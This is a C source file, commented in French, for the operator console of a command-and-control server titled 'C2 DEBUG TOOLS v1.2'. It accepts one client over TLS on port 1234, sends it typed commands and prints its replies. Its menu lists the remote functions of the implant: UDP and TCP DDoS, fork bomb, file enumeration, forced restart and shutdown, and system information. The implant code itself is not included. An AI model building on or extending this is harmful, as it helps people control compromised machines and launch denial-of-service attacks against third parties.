#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define PORT 1234

int main() {
    int serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    socklen_t addrLen = sizeof(clientAddr);
    char buffer[1024];
    char clientIP[INET_ADDRSTRLEN];
    system("clear");
    // Initialise OpenSSL
    SSL_library_init();
    SSL_load_error_strings();

    // Création du socket serveur
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) {
        perror("Erreur lors de la création du socket");
        return 1;
    }

    // Configuration de l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    // Liaison du socket à l'adresse et au port
    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1) {
        perror("Erreur lors de la liaison du socket");
        close(serverSocket);
        return 1;
    }

    // Mise en écoute du socket
    if (listen(serverSocket, 1) == -1) {
        perror("Erreur lors de la mise en écoute du socket");
        close(serverSocket);
        return 1;
    }
	
    printf("En attente de connexion...\n");

    // Acceptation de la connexion entrante
    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &addrLen);
    if (clientSocket == -1) {
        perror("Erreur lors de l'acceptation de la connexion");
        close(serverSocket);
        return 1;
    }

    // Conversion de l'adresse IP du client en chaîne de caractères
    inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
    printf("Client connecté depuis l'adresse IP : %s\n", clientIP);

    // Création du contexte SSL
    SSL_CTX *ssl_ctx = SSL_CTX_new(SSLv23_server_method());
    if (!ssl_ctx) {
        perror("Erreur lors de la création du contexte SSL");
        close(clientSocket);
        close(serverSocket);
        return 1;
    }

    // Configuration du certificat et de la clé privée SSL
    if (SSL_CTX_use_certificate_file(ssl_ctx, "/key/cert.pem", SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ssl_ctx, "/key/key.pem", SSL_FILETYPE_PEM) <= 0) {
        perror("Erreur lors de la configuration du certificat/clave SSL");
        SSL_CTX_free(ssl_ctx);
        close(clientSocket);
        close(serverSocket);
        return 1;
    }

    // Création de l'objet SSL et association avec la socket du client
    SSL *ssl = SSL_new(ssl_ctx);
    SSL_set_fd(ssl, clientSocket);

    if (SSL_accept(ssl) <= 0) {
        perror("Erreur lors de l'acceptation de la connexion SSL");
        SSL_free(ssl);
        SSL_CTX_free(ssl_ctx);
        close(clientSocket);
        close(serverSocket);
        return 1;
    }

    int choice;
    do {
    	 system("clear");
        // Affichage du menu
        printf("\n===-------- C2 DEBUG TOOLS v1.2 --------===\n\n");
        printf("1. Envoyer un message au client\n");
        printf("2. Lister les clients\n");
        printf("3. Quitter\n\n");
        printf("4. Listes des fonctions\n\n");
        printf("Votre choix : ");
        if (scanf("%d", &choice) != 1) {
            // Si l'entrée n'est pas un nombre, afficher un message d'erreur
            printf("Erreur : Veuillez entrer un nombre.\n");
            choice = 0; // Réinitialise le choix pour éviter une boucle infinie
        }
        getchar(); // Capture du retour à la ligne après le choix

        switch (choice) {
            case 1:
            // Saisie du message à envoyer
            printf("\n\nEntrez un message à envoyer au client : ");
            fgets(buffer, sizeof(buffer), stdin);

            // Envoi du message au client via SSL
            int bytesSent = SSL_write(ssl, buffer, strlen(buffer));
            if (bytesSent <= 0) {
                perror("Erreur lors de l'envoi du message au client via SSL");
            } else {
                printf("Message envoyé au client : %s\n", buffer);
            }

            // Attendre la réponse du client
            int bytesRead = SSL_read(ssl, buffer, sizeof(buffer));
            if (bytesRead > 0) {
                buffer[bytesRead] = '\0';
                printf("Réponse du client : \n\n %s\n", buffer);
		getchar();
            } else {
                printf("Erreur lors de la lecture de la réponse du client\n");
                getchar();
            }
            
            break;
            case 2:
                // Affichage des informations sur le client
                printf("Client connecté depuis l'adresse IP : %s\n", clientIP);
                getchar();
                break;

            case 3:
                // Quitter le menu
                printf("Fermeture de la connexion...\n");
                break;
       
            case 4:
                // Listes les fonctions
                printf("1 - DDOS UDP :\n"
               		"2 - DDOS TCP\n"
               		"3 - ForkBomb\n"
               		"4 - Enumeration file\n"
               		"5 - Restart\n"
               		"6 - Shutodwn\n"
               		"7 - System info\n"
               		"8 - Image\n"
               		"9 - Sound\n"
               		"10 - ...\n");
               	getchar();
                break;

            default:
                printf("Choix invalide. Veuillez entrer 1, 2 ou 3.\n");
                break;
        }
    } while (choice != 3);

    // Fermeture des connexions SSL et libération des ressources
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ssl_ctx);

    // Fermeture des sockets
    close(clientSocket);
    close(serverSocket);

    return 0;
}
